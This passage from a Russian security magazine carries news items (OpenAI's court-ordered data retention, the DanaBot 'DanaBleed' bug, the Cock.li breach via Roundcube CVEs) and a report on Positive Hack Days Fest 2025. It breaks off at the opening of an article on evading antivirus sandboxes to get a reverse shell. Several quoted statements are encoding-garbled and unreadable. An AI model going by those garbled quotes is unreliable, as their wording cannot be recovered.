исполнения пос тановления. Одна ко в нас тоящее вре мя компания вынуж дена
отсту пить от «давно устоявшихся норм конфиденциальности» и ослабить пра -
вила, на которые опираются пользователи в соответствии с условиями пре -
дос тавления услуг ChatGPT.
  Кроме того, в заяв лении ком пании отмечается, что теперь OpenAI не уве -
рена в том, что сможет соблюсти строгий закон ЕС о защите дан ных —
General Data Protection Regulation (GDPR), который предоставля ет поль -
зовате лям « право на забвение ».


    Ìû òâåð äî óáåæäåíû, ÷òî The New York Times âûõîäèò çà ðàì êè, —
      çàÿâ ëÿåò Ëàéòêýï. — Ìû áóäåì ðàáîòàòü íàä îáæà ëîâà íèåì ýòîãî ïîñ -«
      òàíîâ ëåíèÿ, ÷òîáû è äàëüøå ñòà âèòü âàøå äîâåðèå è êîíôèäåíöèàëü -
      íîñòü íà ïåð âîå ìåñ òî.                »
К своему заяв лению OpenAI при ложи ла FAQ, в котором объясняет, какие
именно данные поль зователей компания хранит и как они могут быть рас кры -
ты. Например, как уже отме чалось выше, пос тановление не затрагивает биз -
нес-кли ентов OpenAI API и поль зователей, заключивших соглашения Zero
Data Retention, поскольку их данные не сохраняются вообще.
   Что каса ется всех остальных, OpenAI заявляет, что доступ к удаленным
чатам пользователей дей ствительно может быть получен, однако они «не
будут автомати чес ки переда ны The New York Times». Вместо этого данные
будут «храниться в отдельной защищенной сис теме», и к ним нель зя будет
получить доступ или использовать в иных целях, кроме выполнения юри -
дичес ких обязатель ств.
  В  компании  успокаивают  пользователей,  под черкивая,  что  «только
неболь шая, проверенная команда юрис тов и сотрудников служ бы безопас -
ности OpenAI сможет получить доступ к этим данным, если это будет необ -
ходимо для выполнения наших юри дичес ких обязатель ств».


232 МАТЕРИАЛА НЕ УДАЛИЛА WIKIPEDIA

В Роскомнадзоре сообщили, что Wikimedia Foundation, которой принадлежит Wikipedia, не уда -
лила 232 противоп равных материала, 133 из которых содержат фейки о ходе специаль ной
военной опе рации.


В ведомстве заявляют, что в доступе оста ются матери алы экстремистской и террористической
нап равленности, информа ция о вовлечении несовершеннолетних в совершение противоп -
равных действий (руфинг, зацепинг), статьи об изготов лении взрывчатых веществ, суицидаль -
ный, про наркотический и иной запрещенный кон тент.


Wikimedia Foundation уже неод нократно привлекалась к адми нистративной ответственности
в РФ за неуда ление контента. Так, в 2024 году суды назначили в отно шении компании штрафы
на общую сумму 9 миллионов рублей, в 2025 году сумма штра фов составила 3,5 мил лиона
рублей.





                                     Продолжение статьи →
 Начало статьи
ОШИБКА БОТНЕТА
DANABOT
Эк сперты рассказали об уяз вимости в DanaBot, которая появилась в коде
малвари еще в июне 2022 года. Этот баг позволил исследователям выявить
операторов DanaBot, предъ явить им обвинения, а также нарушить работу
бот нета в мае 2025 года.
   Бот нет DanaBot появился еще в 2018 году. Изначально вредонос был
нацелен на Укра ину, Польшу, Австрию, Италию, Германию и Австралию,
но вскоре расширился и на Северную Аме рику.
  Он рас простра нялся по модели MaaS (malware-as-a-service, «малварь
как услу га») и сна чала был банковским трояном, позволявшим похищать кон -
фиденциаль ные дан ные из зараженных систем. Одна ко позже он превратил -
ся в плат форму рас пространения и загрузчик для дру гих семейств вредонос -
ных программ, включая вымогательское ПО.
  Кроме того, позже адми нис тра торы DanaBot создали вторую версию сво -
его ботнета для кибершпи онажа, нацелен ную на военные, дипломати ческие
и правитель ственные организации в Северной Америке и странах Европы.
  Специалисты компании  Zscaler, обнаружив шие в коде малвари  уяз -
вимость, которая получи ла наз вание DanaBleed, объясняют, что эта утеч ка
памяти позволяла проникнуть во внутренние опе рации злоумышленников
и узнать, кто за ними сто ит.
   Бла годаря уяз вимос ти была соб рана ценная информация о киберпрес -
тупниках, что поз волило пра воохранительным органам про вести операцию
«Энд шпиль» и вывес ти инфраструктуру DanaBot из строя, а также выдать
ордера на арест шес тнадцати граждан России, которые якобы связаны
с активностью мал вари.
  По словам спе циалистов, проблема DanaBleed появилась в коде вредоно -
са в июне 2022 года, в версии 2380, куда был добавлен новый C&C-протокол.
Ошиб ка в логике нового протокола ока залась связана с механизмом генера -
ции ответов сервера кли ентам. Так, сервер должен был вклю чать в ответы
случай но сге нерированные бай ты (padding bytes), однако не ини циализиро -
вал для них недав но выделенную память.
  В итоге исследова тели Zscaler смог ли собрать и проанализировать боль -
шое количество C&C-ответов, которые из-за бага содер жали фрагменты дан -
ных из памяти сервера. Проб лема получила наз вание DanaBleed,  так
как напоми нала уяз вимость HeartBleed , обна руженную в 2014 году и зат -
ронувшую OpenSSL.
  С помощью DanaBleed исследователи собрали широкий спектр данных,
вклю чая:
 • информацию об участни ках группировки (имена пользователей, IP-адре -
   са);
 • данные о бэкенд-инфраструктуре (IP-адреса, домены управляющих сер -
   веров);
 • данные о жертвах (IP-адре са, учетные данные, похищен ная информация);
 • логи внесенных в малварь изменений;
 • при ватные крип тографичес кие ключи;
 • SQL-зап росы и жур налы отладки;
 • фраг менты HTML и веб-интерфейса панели управле ния C&C.





Бо лее трех лет DanaBot оставался уязвимым, а разработчики и клиенты мал -
вари даже не подоз ревали, что все это вре мя за ними вниматель но наблюда -
ют ИБ-специалис ты.
  Пос ле операции «Энд шпиль» подозреваемым были предъ явлены лишь
заочные обви нения, и арес тов не последова ло. Иссле дователи полагают, что
конфискация серверов, 2650 доменов и почти 4 миллионов долларов в крип -
товалю те поз волит вре менно ней тра лизовать угрозу. Однако не исклю чается,
что в будущем DanaBot вновь вернется в строй и возобновит активность.


СКОЛЬКО СТОЯТ ДАННЫЕ
Спе циалис ты компании F6 пред ста вили результаты исследования даркнета, проанализировав
криминальные сделки по продаже доступа к корпоратив ным сетям, БД и вре доносных прог -
рамм.

Де шевле все го на хакерских форумах стоят учетные записи — в среднем от 10 долларов
за шту ку.

Дороже всего обходят ся доступы в партнерские программы вымогателей — до 100 тысяч
долларов , а также 0-day-уязвимости, цена которых доходит до 250 тысяч долларов .





Кро ме того, востребованными у злоумышленников оказались доступы к кор поративным сетям.
Их стоимость начина ется от 100–200 долларов , но может доходить до 10 тысяч долларов
в зависимости от масштаба организации, отрасли и уровня доступа.





АТАКА НА COCK.LI
Почтовый хос тинг-провай дер Cock.li пос традал от утечки данных. Хакеры вос -
пользовались уяз вимос тями в Roundcube Webmail и похитили более мил -
лиона поль зователь ских записей.
  Инцидент зат ронул всех пользовате лей, которые заходили в почтовый
сервис с 2016 года (согласно под сче там, это 1 023 800 человек). Так же были
раскры ты контактные данные еще 93 тысяч пользователей.
   Cock.li — это расположенный в Германии бес платный поч товый хос -
тинг-провай дер, ориентированный на конфиденциальность. Сервис сущес -
тву ет с 2013 года, и им управляет единс твенный администратор, известный
под псевдонимом Вин сент Кенфилд (Vincent Caneld). Сервис рекламируется
как альтернатива обыч ным поч товым провайдерам и под держивает стан дар -
тные протоко лы, вклю чая SMTP, IMAP и TLS.
  В основном Cock.li исполь зуют люди, которые не доверяют круп ным про -
вай дерам, а также члены ИБ- и опенсорс-сообществ. Кроме того, сервис
весь ма популярен сре ди кибер преступни ков, например связан ных с вымога -
тель ски ми группировками Dharma и Phobos.
  В прош лом  у  платформы  уже  возникали юридические  проблемы:
в 2015 году немецкие правоохранители конфисковали сервер и жес ткие дис -
ки Cock.li после того, как неизвестный разос лал в учебные учреждения США
пись ма с лож ным сообщением о заложенной бомбе.
   Теперь же  работа  Cock.li неожи дан но прервалась  в  начале  июня,
и какое-то время пользовате ли могли только гадать, что произошло.
  Од нако вскоре на хакфоруме XSS появи лось сообщение от зло умыш -
ленни ка, который заявил, что продает две базы данных с дампом Cock.li,
содержащие конфиденциальную информа цию о пользовате лях. Хакер оце нил
дамп как минимум в один биткоин (око ло 104 тысяч долларов по курсу
на момент размещения поста).





Лишь нес коль ко дней спус тя на сайте Cock.li было опуб ликовано официаль -
ное заяв ление, под тверждающее факт взлома. Выяс нилось, что хакерам дей -
ствитель но удалось похитить информацию для 1 023 800 учетных записей,
вклю чая:
 • адреса электронной почты;
 • временные мет ки первого и пос ледне го входа в систему;
 • данные о неудачных попытках вхо да и их количес тве;
 • язы ковые нас тройки;
 • сери ализован ный блоб нас троек Roundcube и email-подпись;
 • имена контактов (только для 10 400 акка унтов);
 • email-адреса контактов (только для 10 400 акка унтов);
 • vCards (толь ко для 10 400 акка унтов);
 • коммента рии (толь ко для 10 400 аккаунтов).

В заяв лении под черки валось, что пароли пользователей, содер жимое писем
и IP-адреса не были скомпрометированы, пос кольку их не было в украденных
БД. Также сооб щалось, что 10 400 пользовате лей, у которых похитили контак -
тную информа цию третьих лиц, получат отдель ные уведомления.
  В итоге всем, кто пользовался сер висом с 2016 года, рекомендуется
как можно скорее сбросить пароли для своих учетных записей.
  В Cock.li полагают, что данные были укра дены с помощью старой уяз -
вимости SQL-инъекций в Roundcube Webmail ( CVE-2021-44026 ). При этом
незадолго до взлома пред ставители сервиса изучали более свежую RCE-уяз -
вимость в Roundcube ( CVE-2025-49113 ), которая уже при меняется в атаках.
По результатам этого анализа, в июне 2025 года Roundcube был полностью
уда лен с плат формы.


       Cock.li  áîëüøå  íå  áóäåò  ïðåä ëàãàòü  ïîëüçîâàòå ëÿì  Roundcube
      Webmail, — ïèøóò ïðåä ñòà âèòå ëè ñåð âèñà. — Íåâàæíî, áûëà ëè íàøà«
      âåð ñèÿ óÿç âèìà, ìû óçíà ëè î Roundcube äîñ òàòî÷ íî, ÷òîáû íàâ ñåãäà
      îò íåãî îòêà çàòüñÿ. Ìû îïðå äåëåííî ðàñ ñìàòðèâà åì âîç ìîæíîñòü
      èñïîëüçîâàíèÿ äðó ãîé âåá-ïî÷ òû, íî ýòî íå ÿâëÿåòñÿ ïðèîðèòåòíîé
      çàäà÷åé.                »
В офи циальном сооб щении упоминалось, что более эффективные методы
обес печения безопасности могли бы предот вра тить взлом и утечку поль -
зовательских данных. Также представители сервиса признали, что «Cock.li
вооб ще не стоило исполь зовать Roundcube».
   Теперь ИБ-спе циалисты полага ют, что эта утечка может оказаться цен ным
материалом для исследователей и правоохранительных орга нов. Дело в том,
что раскрытая информа ция может помочь получить дополнительные дан ные
о злоумышленни ках, использующих эту платформу.


80% МЕДИЦИНСКИХ ОРГАНИЗАЦИЙ УЯЗВИМЫ
ДЛЯ ХАКЕРОВ
По данным «Информзащиты», 83% россий ских организаций, работа ющих в сфере здра воох -
ранения, имеют критические уязвимости в ИТ-инфраструктуре. То есть подавляющее боль -
шинство клиник и медучрежде ний уяз вимы перед кибера таками.

Такая ситуация скла дывается из-за недооценки рис ков , нехватки денег и специалис -
тов , а также использования старого обо рудо вания и устаревших систем.

На информационную безопасность тратится лишь 5–10% бюджета медуч реждений.

С начала 2025 года 76% медорганизаций столкнулись с атаками (чаще все го — с фишингом
и шиф ровальщиками). У каждой четвертой орга низации под угрозой оказались данные
пациентов: диагнозы, пла ны лечения и прочая конфиденциальная информация.





ОТКАЗ
ОТ УСТАРЕВШИХ
ДРАЙВЕРОВ
Компания Microsoft объ явила, что будет пери оди чески удалять устарев шие
драй веры из каталога Windows Update, чтобы сни зить риски и улучшить сов -
мести мость.


     Öåëüþ  ýòîé  èíèöèàòèâû  ÿâëÿåòñÿ  ïðå äîñ òàâëå íèå  îïòèìàëüíîãî
      íàáîðà äðàéâåðîâ  â  Windows  Update  äëÿ  ðàç ëè÷íûõ  àïïà ðàòíûõ«
     ðåøåíèé â ýêîñèñ òåìå Windows, à òàê æå îáåñ ïå÷åíèå áåçîïàñ íîñòè
       Microsoft Windows, — ãëà ñèò ñîîáùåíèå êîì ïàíèè. — Ýòà èíèöèàòèâà
      ïðåä ïîëàãà åò ïåðèîäè÷åñ êóþ î÷èñ òêó äðàéâåðîâ â Windows Update,
      â ðåçóëüòàòå ÷åãî íåêîòîðûå äðàéâåðû íå áóäóò ïðå äîñ òàâëÿòüñÿ ñèñ -
     òåìàì â íàøåé ýêîñèñ òåìå.                »
Как уточнили в компании, первый этап процеду ры «очистки» зат ронет драй -
веры, для которых в Windows Update уже име ются более новые альтернативы.
  Под «очис ткой» понима ется уда ление привяз ки драйверов с истекшим
сроком действия к ауди ториям в Windows Update, в результате чего они
не  будут пред лагаться ни одной  сис теме под  управлением  Windows.
Это будет реали зовано путем удаления соответствующих назначений ауди -
торий старых драйверов в Hardware Development Center.
   Также сообщает ся, что в будущем Microsoft рас ширит перечень категорий,
которые могут быть исклю чены из Windows Update ради повышения безопас -
ности. Отме чает ся, что при этом партнеры по-прежнему смогут повторно пуб -
ликовать драйверы, уда ленные Microsoft, если пре дос тавят для этого биз -
нес-обос нование.

      Óäà ëåíèå  óñòà ðåâ øèõ äðàéâåðîâ èç Windows Update —  ýòî ïðî -
      àêòèâíàÿ ìåðà êîì ïàíèè  Microsoft, íàï ðàâëåííàÿ íà îáåñ ïå÷åíèå«
      áåçîïàñ íîñòè è ïîâûøå íèå êà÷åñ òâà äðàéâåðîâ äëÿ ïîëüçîâàòå ëåé
      Windows, — äîáàâ ëÿþò ðàç ðàáîò÷èêè. — Â äàëüíåéøåì ñëå äóåò îæè -
       äàòü, ÷òî î÷èñ òêà ñòà íåò îáû÷ íîé ïðàê òèêîé, à òàê æå áóäóò ââå äåíû
      íîâûå ðåêîìåíäàöèè ïî ïóáëèêàöèè, êîòîðûå ïîìîãóò âñåì ïîëü -
      çîâàòå ëÿì  Windows  ïîä äåðæèâàòü  ñâîè  ñèñ òåìû  â  áåçîïàñ íîì
      è íàäåæíîì ñîñ òîÿíèè.                »

ДРУГИЕ ИНТЕРЕСНЫЕ СОБЫТИЯ МЕСЯЦА
Правоохраните ли закрыли сервис для провер ки малвари AVCheck


Троян проник в npm-пакеты, которые еженедельно заг ружают более миллиона раз


Рас ширения для Chrome раскрывают клю чи API и содержат учет ные данные


Crocodilus добавляет фальшивые контакты на взломанные устрой ства


Умные часы могут извлекать данные с изолированных машин


Власти РФ рассматривают запрет на авториза цию через инос транные email


Linux Foundation запускает децентра лизованный менеджер плагинов для WordPress


Конфиско ваны домены кар дерского маркетплей са BidenCash


Четыре участника груп пы REvil выш ли на свободу


В палате пред ставителей США зап ретили использовать WhatsApp
COVERSTORY





Мос ква, 22–24 мая 2025 года, СК «Луж -
ники», открытая и зак рытая зоны, Standoﬀ
15. Та же локация второй год подряд, куча
активнос тей, изма тывающая жара, сотни
докладов  и  десятки  тысяч  прой денных            @fearisbigbusinessV3XX
шагов. Уже понял, о чем речь? Все верно,
сейчас будем погружаться в мир кибер -
безопас ности и вспо минать, как прошел
оче редной Positive Hack Days Fest!


ÈÍÒÐÎ

Про исходящее в СК «Лужники», как и в прошлые годы, было разделено на две
основные зоны: открытую и закрытую. Суть открытой — раз влекательной —
зоны в том, что достаточ но пройти на тер риторию СК и выбирать любое
из множества развле чений. Дос туп в закрытую — про фес сиональную — зону
обес печивали специальные бейджи, и эта зона ориентирована больше
на специалис тов сферы инфобеза, пред ста вителей органов власти, СМИ
и бизнес.





                    Тра дици онный дефейс бейджа

Никто на про ходах не лютовал, и проскочить в закрытую зону фестиваля иног -
да можно было без бейджа вооб ще или налутав отдельный бейдж Positive
Hack Media. Впрочем, в чем тут азарт, я не вполне понимаю: билет стоит
недорого, а вырученные с продажи день ги идут на благот ворительность. Тем
не менее некото рые все же пытаются ходить вде сятером по одному бей -
джу — возможно, дань какой-то традиции.




                      Программа  фестиваля:  день  первый ,  вто рой
                      и тре тий .



ÎÒÊÐÛÒÀß ÇÎÍÀ ÔÅÑÒÈÂÀËß





  Инсталляции и активнос ти начинались прямо со входа на тер риторию СК

Первое, что бросалось в глаза, — это огромное количество семейных пар
с деть ми. И неуди витель но: сот ня шагов от глав ного входа на территорию
«Лужников», и посетители ока зыва лись в окружении раз ноцветных шатров,
аниматоров  и  активнос тей  с  конкурса ми,  образующих  не  что  иное,
как обновленный «Кибергород» с интерактивными инсталляциями. На боль -
шом экра не все так же вел ся юморис тичес кий новостной репортаж о клю -
чевых событиях цифрового города. Прохожим, кажет ся, нравилось.





             Ки бервход киберпоходкой на киберфестиваль

Основное дви жение шло по часовой стрелке, и было вид но, что первая часть
территории «Кибергорода» однозначно предназна чалась детям. Образова -
тель ные павильоны и игровые зоны  от име нитых компаний органично
переме шивались  с  раз влекательными  инсталляциями. В  каждой  такой
локации были какие-то конкурсы или увлекатель ные задачки — на любой вкус
и выбор.





                   Де ти. Они были повсюду

По мере продвижения от павильона к павильону появ лялось ощущение, что
в этом году делали боль ший акцент на образовании и на молодежи в целом.
И вот это ощущение эхом отзы валось на общем впечатлении о нынешнем
PHDays. Форум, где ребята в худи и гос пода в пиджаках встречают ся, что бы
обсудить безопасность, остался в прош лом.





              Очеред ная зона с активностями для детей

Одна из самых необычных зон «Кибергорода» — «Запретный лес». Сочетание
русских ска зок, магов-волшебни ков-гадалок, нас троений Дикого Запада
и технологий вызвало непод дель ный интерес. Настоящее ска зоч ное безумие.
Пройти мимо Горыныча, сидящего на цепи и отпускающего колкие шуточки
в адрес прохожих, как ты понимаешь, было невоз можно.





     Владения Змея Горыныча, в которые рекомен довалось не влезать

Тут же дети могли при общиться к духу киберпанка: покосив шийся деревянный
забор и высокие технологии как наг лядная иллюстра ция принципа жанра —
«high tech, low life».
  Решительно проигно рировав многочисленные предуп реждения, я все же
полюбопытс твовал, что там внутри. И внут ри ока зались…





               То самое пре дупреждение-рекомендация

Де ти. По моим наблюдени ям, они пытались исследовать все, до чего дотяги -
вались. А где не дотяги вались, там исполь зовали пенек или при бегали
к помощи родителей. Кста ти, с тех никой они обра щаются весьма уверен но:
никакой неловкости и пробуксовки «а куда нажимать». В общем, подрастает
смена!





  Как и в прошлые годы, дети были крайне вовлечены в подготовленные
  активнос ти





  Что-то в этих стиральных машинах отмывалось. Воп росов задавать
  не будем

Ани маторы и в этом году отра батывали на 200%, увлекая гостей фестиваля
историями, наход чивостью, артистиз мом и трю ками в общем формате эдакой
киберсказ ки. Дети мес тами будто прописы вались в зоне работы пон равив -
шихся ани маторов, явно не торопились уходить и с настроением подыг -
рывали.





  Не поверите, но дети смот рели футбольный матч. Кто-то кому-то дал пас
  в момент съем ки

Пуб лика киберфестиваля была весьма разнообразной, и аниматоры ловко
зав ладевали внимани ем не толь ко детей, но и взрос лых и опытных иска телей
приключений. Я даже призадумался: и в жиз ни ведь кибер мошенники,
по сути, тоже «увле кают» свою жертву придуманной историей.





  Ки бермошен ник или кибербарыга — роль безуп речна, как и внешний вид

Кстати, и публика тоже подобралась пестрая: пару раз ловил себя на мыс ли,
что не уверен, ани матора встретил или посети теля. Кстати, всего на этот раз
фестиваль посетило более 150 тысяч гос тей.





  Уди витель ный симбиоз необычных инсталляций и ярких нарядов посети-
  телей фес тиваля

В общем, дети рубились в нас тольные игры и решали оче редные головолом -
ки, да и родители нет-нет да и оказывались втянуты ми в игры. Так что со сто -
роны это порой выглядело как игры целых семей.





               Де ти пытались соб рать головоломку

Игры и веселье — это прекрасно, но была и образовательная программа.
Дети, к примеру, могли послушать полез ный доклад о способах выявления
фейков, с избытком и на годы вперед сгенерированных нейросетями. Строго
говоря, это полезно знать вообще всем, а не толь ко детям.





          «Что выдает фейк?» — важный воп рос нашего времени

Вторую  часть «Кибергорода» сос тавляла зона для  студентов, будущих
и нынеш них: Education Hub, «Аллея вузов и стажировок» и «Науч поп-сцена
KULIBIN». Шатры самых раз ных учебных заведе ний притягивали тол пы
молоде жи, а ближе к концу третьего дня к главной сцене стали собираться
граждане в ожидании концертной программы киберфестиваля. В общем,
весь ма оживленная локация.





       Ша тер МГТУ пользовал ся повышенной популярностью





                              Education HUB

Я заглянул и в зону компании Jet. Там ору довала целая груп пиров ка промоде -
вушек, раз дающих мороженое из корзинок за подписку на канал в Telegram.
Во второй половине дня можно было заметить, что практически все на этом
учас тке спорткомплекса ходят с мороженым в руках. Все гени альное просто!





                            Стенд Jet

Одна из весь ма популяр ных и ярких локаций фестиваля была представлена
«Т-Бан ком». Эдакий футуристичес кий оазис в город ской пустыне, да еще и с
раздачей сувени ров под его крышей. Справа были организованы зоны отды -
ха, слева всег да была боль шая оче редь на подъ ем на второй этаж. Локация
неболь шая, но красивая и эсте тичес ки при ятная.





                    Вил ла «Т-Банка». Нейрощит





             Второй этаж великолепен, но поч ти безлюден





                    Все тусуются где-то рядом

Если нужно было более спокойное место для отды ха, то места нап ротив глав -
ной сце ны «Кулибин» для этого отлично подходили. Со сце ны рас сказывали
о борь бе со всем плохим ради все го хорошего («Научпоп»). Кто-то под эти
лекции даже умуд рялся заснуть, видимо измотан ный жарой и движухой.





                       Главная сцена фестиваля





  Лю ди не столь ко слушали про кражу данных со сце ны, сколько спали
  и обща лись

Проблему прошлого года с дефицитом питьевой воды в этот раз решили
радикально и без компромис сов. У всех жела ющих был свободный дос туп
к фонтанчикам, что из-за жары не теряло акту аль нос ти все три дня фестиваля.
Источни ков воды было дос таточно, чтобы не образовы вались оче реди. Прос -
то и удоб но.





                     Жажда — ничто

С едой проблем также не было: на нес кольких боль ших локациях предлагали
все, от слад кой выпечки до бургеров, лапши и риса, и все это по весьма уме -
ренным ценам.
  Впрочем, не все шло идеально — я столкнул ся с тем, что сразу в нес коль -
ких точках по неизвестной при чине не работали холодиль ники. На жаре они
превратились в нас тоящие печи, сильно разогревая хранившиеся в них
напитки.





          Ели и пили много. Эти зоны практичес ки не пустовали




                                     Продолжение статьи →
COVERSTORY                     НАЧАЛО СТАТЬИ





          КАК ПРОШЕЛ КИБЕРФЕСТИВАЛЬ
        И ПОЧЕМУ НА НЕМ СТОИЛО БЫТЬ




Подводя итог, могу ска зать, что развлекатель ная часть кибер фести валя
со  сво ей  задачей  прекрасно спра вилась. Народ был  развле чен,  сыт
и доволен!


ÇÀÊÐÛÒÀß ÇÎÍÀ ÔÅÑÒÈÂÀËß





Про фес сиональ ная зона на фоне уви денного до этого просто жила своей
жизнью, буд то вокруг нет ни «Кибергорода», ни Горыныча, ни кибер барыг
с волшебниками и гадалками. По логике вещей так и должно быть, но, когда
постоянно перемещаешься, «переключиться» успе ваешь не всег да.





Внутри «Киберарены» раскинулась целая сеть (выс тавка) пар тнеров фес-
тиваля и ИТ-ком паний, презентующих свои про дукты и услуги. Здесь происхо -
дящее тоже было разнообразным: чтобы ты понимал разброс, скажу, что
на одном из стендов проводи лось подобие чайной церемонии.





На аре не «Ломоносов», находящейся под кры шей «Киберарены», диалог выс -
траива ли между собой име нитые эксперты из самых разных отраслей, пред -
ста вители биз неса и политики, а в роли модера тора одной встречи выступил
журналист и телеве дущий Вла димир Поз нер, чему многие неподдельно уди -
вились.





                    Опять говорили про багбаунти

Я  заг лянул в  эту локацию во время встречи, посвященной багбаун ти,
но чего-то нового для себя не услышал — так или иначе подобная информа -
ция в этой сфе ре звучит регулярно, равно как и прогнозы на обозримое
будущее. Про исходящее на сцене, очевид но, было рас считано в первую оче -
редь все же на пред ста вите лей бизнеса.
  Об щение строилось в спо кой ном формате, мнениями и экспертным опы -
том делились как наши сооте чественники, так и специалисты из других стран.


«ÊÈÁÅÐÕÀÁ» È STANDOFF 15





В этот раз кибербитва Standoﬀ проходи ла на территории большого крытого
павиль она, расположенного особняком от все го прочего. Внутри царила зна -
комая многим атмосфера про тивос тояния «крас ных» и «синих» (команды ата -
ки и защиты/расследова ния). Промежуточные ито ги схват ки и самые опасные
ата ки можно было наблюдать на огромном экране. Парал лельно с этим мож -
но было рассмат ривать макет «Государс тва F», выполненный безуп речно
до мельчайших деталей.





Ма кет обновля ется из года в год, при обретая новые объ екты инфраструк -
туры. На нем отобража ются пос ледствия успешно реализованных  атак
в режиме реаль ного времени. Сложно, зрелищно, прес тижно.
  В этом году была смоделирова на городская сре да, логистика, нефтегазо -
вая область, металлургия, энер гетика, банковский сектор и авиация.





                    Более под робно про все актуальные зоны макета
                        «Государства F» ты можешь почитать по ссыл кам:
                         городская среда , логистика , нефтегаз , ме тал -
                        лургия , энергетика , бан ковский сек тор , авиация .
                   Офи циальный сайт кибербитвы Standoff 15.





Лю бая серьезная ата ка на городской объект моменталь но оживляла весь
павиль он: зву ковые эффекты, освещение, яркая картинка на экране. Эффект
погружения обеспечен!





      Какие-то кудес ники реали зовали атаку, экран быстро покраснел

Зо на с конкурса ми рас полага лась, разуме ется, в «Киберхабе»: IDS Bypass,
«Взлом Web3», RoboCafe, SEQuest, $natch Hydra, AI CTF, Root of the Hill.
  Бы валые участники PHDays навер няка помнят часть этих кон курсов, а вот
традици онной горячи тельно-любимой «Наливайки» (aka 2drunk2hack) в этом
году не было. Как я понял, этот конкурс был переосмыслен в Root of the Hill —
условия конкурса час тично сов пада ют. Демонс три ровать способность трезво
мыс лить в любой ситу ации нужно уже без штрафных шотов, делая акцент
на скорос ти принятия правильных решений. Больше ломай и получай за это
баллы, меньше триггери WAF, укрепляя свои шансы называться царем кибер -
горы. Конкурс более хардкорный, а в качес тве бонуса еще и стал доступен
несовершеннолет ним участникам. Все в плюсе (кроме желающих накидаться,
конечно).





                Зона традиционных конкурсов PHD

Впрочем, кон курс RoboCafe давал шанс получить алкоголь в виде «пенного»,
да еще и с закуской — бутер бродом. Для этого нуж но было лишь подчинить
себе робока фе, шаг за шагом обна руживая и эксплуатируя уязвимости сайта,
киос ка и мобильного при ложения.





  Чем занять ся на PHD? Лутать бутер броды с колбасой. Битва была ожес -
  точенной

Ин терес исследователей под стегивался потен циальной возможностью взло -
мать робока фе не только чтобы заполу чить трофейное пиво, но и чтобы
устроить битву роборук, бла го их в киос ке две. Задания решались, баллы
копились, меня любезно угос тили колой, продемонс три ровав работу киос ка,
но до вос стания машин в робока фе было еще далеко.





             Хлеб, колбаса и кола. И пусть весь мир подождет

Если «Кибергород» по ощущениям просто бурлил,  то на «Киберхабе»
динами ка совсем другая — все чинно, благородно и даже как-то сонно.
  В «Киберхабе» за три дня было прочита но в общей сложности 158 док -
ладов, вклю чая Standoﬀ, воркшопы и доклады о раз работке. На треки Oﬀense
и Defense в этом году пришлось по 18 докладов на каж дый.
  За те же три дня на «Киберарене» было прочитано 244 доклада. В прош -
лом году, напомню, соот ношение докладов по тематикам кибербеза и биз -
неса сос тавило 119 к 134. Как вид но из этих цифр, тен денция прош лого года
с уве личением доли докладов для бизнес-трека заметно укре пилась. Док -
лады «Кибергорода» по циф рам (98 док ладов), видимо, имеют все шансы
догнать и обог нать трек кибербеза в следующем году.





                 Не безопас ные про верки Nuclei

Сде лать фотографию пус той зоны «Киберхаба» получилось только в кон це
третьего дня PHD. Внешне условия мог ли показаться спартан скими, но это
более чем умес тный выбор. При ходи, слу шай док лады, участвуй в конкурсах.
Все по сути и без суеты, ничего лишнего.





Там же я увидел дос ку для рисования, над которой значился потрясающий
по своей сути вопрос: «Какой совет в карь ере ты бы себе дал пять лет
назад?» Не знаю, чья это была идея, но мне пон равилось! В сле дующем году
можно раз вить идею и сде лать полотно еще больше.





                      Boom, Flipper и котик

По мимо шуток, иллюстраций и пожела ний, там были зафик сирова ны и весьма
любопыт ные мыс ли, в которых улавливалось: верь в себя, не бой ся, рискуй,
все получит ся. Вро де бы и прописные истины, но порой именно к ним мы
не спешим прис лушиваться.





                Ито ги кибербитвы под ова ции зри телей

Фи нал Positive Hack Days Fest состоял из наг ражде ния победи телей кибер -
битвы Standoﬀ 15 на главной сцене «Кулибин» под аплодисменты соб равших -
ся перед ней зри телей и яркие спе цэффекты. Было заметно, что при всей
харизме и позитивном настрое участники битвы порядком измотаны. По этой
же при чине на сцене их не мучили, а прос то наг ражда ли, хвалили, попутно
делая памят ные фотографии.





                   Dream Team — первое мес то

Следом за  наг раждением финалистов Standoﬀ 15 последовал кон церт
Uma2rman, Мина ева и ГРАНЖа, окончательно зак рывающий три дня фес -
тиваля.


ÀÓÒÐÎ





Учи тывая сме ну формата Positive Hack Days с ИБ-конферен ции (форума, если
угод но) на ИБ-фес тиваль, стоит отметить, что сами энтузиасты инфобеза
и собс твенно хакеры уже не явля ются здесь каким-то клю чевым элемен том.
Да, концепция все еще строится вокруг безопас ности, но чем дальше, тем
боль ше это похоже на формальность. Была как-то даже озвучена мысль, что
если из названия убрать слово hack, то наз вание фестиваля будет более чес -
тным и относитель но фор мата, и относитель но происхо дящих на фес тивале
событий. Думаю, часть правды в этом есть.
  С другой стороны, было много позитив ных оце нок мероп риятия, осо бенно
от тех, кто не зас тал прежний формат PHD. Если посмотреть на PHDays Fest
как на совершенно новый ивент, то понима ешь: посетителям предлагается
много полез ного и при ятно го.
   Тут и богатая палитра ИТ-направлений с док ладами, и стен ды компаний
и партнеров фестиваля, где можно было общаться с их представителями,
и даже воз можность для молоде жи выбрать вуз, пла нируя свое будущее.
Не говоря уже про многочисленные конкурсы и прочие активнос ти. Размах
фестиваля впечат ляет, и я не удивлюсь, если в сле дующем году нас будет
ждать что-то еще более грандиоз ное.
  В этом году слоган PHD — «Кибер город. Будущее строим мы» — весь ма
точно отражает суть происходяще го вокруг нас здесь и сей час. Это вопрос
выбора: идти или стоять; изу чать и осва ивать новое или пытаться оста новить
прогресс; нападать или защищать. Имен но вмес те, движимые общей созида -
тель ной идеей, мы можем шаг за шагом строить свое будущее, и не только
цифровое.
ВЗЛОМ





Как  устроены  антивирусные  песочницы,
известно  лишь  понаслышке:  вендоры
надежно хранят свои сек реты. Что мы уви -
дим, если попыта емся  заг лянуть  к ним
под капот? В этой статье — результаты         Данила@u_t_k_aЛебедев
эксперимента по исследова нию сред ана -
лиза вредонос ного ПО, включая VirusTotal.
Мы написали скрипт для обхо да песочниц
и получили reverse shell: теперь мы точно
знаем, что там внутри.


Однажды мы решили провести тестовую фишинговую атаку в нашей орга -
низа ции, чтобы поднять уро вень осведомленности сотрудников. В роли нас -
тоящего «хакера» я решил построить всю инфраструктуру сам. Зарегал под -
дель ный домен, поднял свой почтовый сервер, сер вер для при ема отсту ка.
И тут приш ло вре мя писать кли ент скую часть, а именно ту полезную нагрузку,
